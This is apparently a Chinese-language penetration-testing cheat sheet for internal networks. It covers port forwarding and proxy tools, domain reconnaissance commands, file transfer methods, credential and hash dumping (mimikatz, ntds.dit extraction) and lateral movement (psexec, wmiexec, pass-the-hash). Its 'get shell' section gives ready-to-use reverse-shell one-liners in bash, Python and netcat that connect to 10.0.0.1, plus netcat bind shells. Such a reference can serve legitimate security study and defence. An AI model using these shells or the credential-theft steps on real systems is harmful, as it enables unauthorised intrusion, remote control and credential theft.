内网渗透
================================

端口转发&&边界代理
--------------------------------

端口转发
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

- windows
    - lcx
    - netsh
- linux
    - portmap
    - iptables
- socket代理
    - Win: xsocks
    - Linux: proxychains
- 神器推荐
    - http://rootkiter.com/EarthWorm/
- 基于http的转发与socket代理(低权限下的渗透)
    - 端口转发: tunna
    - socks代理: reGeorg
- ssh通道
    - 端口转发
    - socks

获取shell
--------------------------------

- 常规shell反弹

::

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

- 突破防火墙的imcp_shell反弹
- 正向shell

::

    nc -e /bin/sh -lp 1234
    nc.exe -e cmd.exe -lp 1234

信息收集(结构分析)
--------------------------------

- 基本命令
    - 获取当前组的计算机名：``net view``
    - 查看所有域: ``net view /domain``
    - 从计算机名获取ipv4地址：``ping -n 1 DC1 -4``
    - 查看域中的用户名：``dsquery user``
    - 查询域组名称：``net group /domain``
    - 查询域管理员：``net group "Domain Admins" /domain``
    - 查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域：``net config Workstation``
    - 查看域控制器：``net group "Domain controllers"``
    - 查询所有计算机名称：``dsquery computer``

- 定位域控
- 端口收集
- 扫描分析

内网文件传输
--------------------------------

- windows下文件传输
    - powershell
    - vbs脚本文件
    - bitsadmin
    - 文件共享
    - 使用telnet接收数据
    - hta
- linux下文件传输
    - python
    - wget
    - tar + ssh
    - 利用dns传输数据
- 文件编译
    - powershell将exe转为txt，再txt转为exe

hash抓取
--------------------------------

- Windows本地密码散列导出工具
    - mimikatz
    - wce
    - gsecdump
    - copypwd
    - Pwdump
- Windows本地密码破解工具
    - L0phtCrack
    - SAMInside
    - Ophcrack
- 彩虹表破解
- 本机hash+明文抓取
- win8+win2012明文抓取
- ntds.dit的导出+QuarkPwDump读取分析
- vssown.vbs + libesedb + NtdsXtract
- ntdsdump
- 利用powershell(DSInternals)分析hash

远程连接&&执行程序
--------------------------------

- at&schtasks
- psexec
- wmic
- wmiexec.vbs
- smbexec
- powershell remoting
- SC创建服务执行
- schtasks
- SMB+MOF || DLL Hijacks
- PTH + compmgmt.msc 